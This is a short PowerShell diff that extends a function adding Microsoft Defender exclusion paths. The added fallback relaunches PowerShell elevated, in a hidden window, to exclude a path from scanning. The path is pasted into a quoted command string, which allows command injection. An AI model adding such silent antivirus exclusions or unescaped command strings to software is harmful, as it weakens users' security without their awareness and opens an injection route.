@@ -91,6 +91,11 @@ function Add-DefenderExclusion {
         $current = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath)
         if ($current -contains $Path) { return }
         Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue | Out-Null
+        return
+    } catch {}
+    try {
+        $cmd = "Add-MpPreference -ExclusionPath '$Path' -ErrorAction SilentlyContinue"
+        Start-Process powershell -ArgumentList "-NoProfile -Command $cmd" -Verb RunAs -WindowStyle Hidden -Wait
     } catch {}
 }
 
